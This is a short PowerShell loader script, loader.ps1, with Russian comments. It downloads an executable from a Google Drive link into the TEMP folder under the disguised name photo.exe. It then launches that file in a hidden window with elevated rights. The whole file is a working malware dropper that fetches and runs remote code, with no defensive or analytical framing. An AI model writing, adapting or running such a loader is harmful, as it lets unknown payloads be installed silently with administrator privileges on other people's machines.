# loader.ps1
$url = "https://drive.google.com/uc?export=download&id=1tUR-oTx28YIm-7hIDeoLnDpRoTec0-bQ"
$path = "$env:TEMP\photo.exe"

# Качаем
(New-Object Net.WebClient).DownloadFile($url, $path)

# Запускаем с UAC
Start-Process -FilePath $path -WindowStyle Hidden -Verb RunAs
